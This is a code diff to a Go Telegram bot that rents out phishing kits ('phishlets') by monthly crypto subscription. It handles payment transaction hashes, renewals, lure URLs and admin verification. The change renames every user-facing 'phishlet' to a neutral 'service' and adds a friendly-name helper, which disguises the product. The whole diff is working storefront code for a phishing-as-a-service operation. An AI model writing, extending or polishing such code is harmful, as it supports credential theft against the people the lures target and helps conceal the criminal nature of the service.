@@ -126,12 +126,11 @@ func (b *TelegramBot) handleCallback(cb *tgbotapi.CallbackQuery) {
 
 	switch action {
 	case "phishlet":
-		// User selected a phishlet for a new subscription — ask for TX hash
+		// User selected a service for a new subscription — ask for TX hash
 		b.send(chatId, fmt.Sprintf(
 			"✅ Selected: *%s*\n\n"+
-				"Now send your payment and submit the TX hash:\n`/pay_%s <tx_hash>`\n\n"+
-				"Or use: `/pay <tx_hash>` (will use %s automatically)",
-			phishlet, phishlet, phishlet))
+				"Now send your payment and submit the TX hash:\n`/pay <tx_hash>`",
+			phishletFriendlyName(phishlet)))
 		// Store phishlet choice in a pending state by creating a placeholder
 		// The /pay command will use the last chosen phishlet or default
 		b.pendingPhishlet(chatId, phishlet)
@@ -144,9 +143,9 @@ func (b *TelegramBot) handleCallback(cb *tgbotapi.CallbackQuery) {
 			return
 		}
 		b.send(chatId, fmt.Sprintf(
-			"✅ Renewing with phishlet: *%s*\n\n"+
+			"✅ Renewing with service: *%s*\n\n"+
 				"Send payment ($%d) and submit TX hash:\n`/renew <tx_hash>`",
-			phishlet, b.cfg.GetSubPrice()))
+			phishletFriendlyName(phishlet), b.cfg.GetSubPrice()))
 		// Update the pending phishlet for renewal
 		sub.Phishlet = phishlet
 		b.db.ActivateSubscription(sub.Id, sub.Username, sub.LureURL, sub.ChainTranslate, sub.ChainBing, sub.ChainDirect, sub.LureId)
@@ -575,7 +574,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 		}
 		kb := b.phishletKeyboard("phishlet")
 		msg2 := tgbotapi.NewMessage(chatId, fmt.Sprintf(
-			"💳 *Subscribe — $%d/month*\n\nChoose your phishlet:", price))
+			"💳 *Subscribe — $%d/month*\n\nChoose your service:", price))
 		msg2.ParseMode = "Markdown"
 		msg2.ReplyMarkup = kb
 		b.api.Send(msg2)
@@ -610,7 +609,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 
 	case "/pay":
 		if len(parts) < 2 {
-			b.send(chatId, "Usage: /pay <transaction_hash>\n\nFirst use /buy to choose your phishlet.")
+			b.send(chatId, "Usage: /pay <transaction_hash>\n\nFirst use /buy to choose your service.")
 			return
 		}
 		txHash := parts[1]
@@ -633,7 +632,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 		// Use phishlet from inline keyboard selection (user must choose)
 		phishlet := b.popPendingPhishlet(chatId)
 		if phishlet == "" {
-			b.send(chatId, "Please use /buy first to choose a service before submitting payment.")
+			b.send(chatId, "Please use /buy first to choose a service, then submit your payment.")
 			return
 		}
 
@@ -691,10 +690,10 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 
 			b.send(chatId, fmt.Sprintf(
 				"⏳ *Renewal submitted!*\n\n"+
-					"Phishlet: `%s`\n"+
+					"Service: `%s`\n"+
 					"TX Hash: `%s`\n\n"+
 					"Admin will verify and extend your subscription.",
-				phishlet, txHash))
+				phishletFriendlyName(phishlet), txHash))
 
 			adminId := b.cfg.GetBotAdminChatId()
 			if adminId != 0 {
@@ -732,9 +731,9 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 		kb := b.phishletKeyboard("renew_phishlet")
 		m := tgbotapi.NewMessage(chatId, fmt.Sprintf(
 			"🔄 *Renew Subscription — $%d/month*\n\n"+
-				"%sChoose phishlet (or keep current: `%s`):\n%s\n\n"+
+				"%sChoose service (or keep current: `%s`):\n%s\n\n"+
 				"After choosing, send payment and run:\n`/renew <tx_hash>`",
-			price, expiry, sub.Phishlet, wallets))
+			price, expiry, phishletFriendlyName(sub.Phishlet), wallets))
 		m.ParseMode = "Markdown"
 		m.ReplyMarkup = kb
 		b.api.Send(m)
@@ -751,8 +750,8 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 			exp = fmt.Sprintf("\n📅 Expires: `%s`", time.Unix(sub.ExpiresAt, 0).Format("2006-01-02 15:04 UTC"))
 		}
 		b.send(chatId, fmt.Sprintf(
-			"%s *Subscription Status: %s*%s\n\nPhishlet: `%s`",
-			emoji, strings.ToUpper(sub.Status), exp, sub.Phishlet))
+			"%s *Subscription Status: %s*%s\n\nService: `%s`",
+			emoji, strings.ToUpper(sub.Status), exp, phishletFriendlyName(sub.Phishlet)))
 
 	case "/mylink":
 		sub, err := b.db.GetSubscriptionByChatId(chatId)
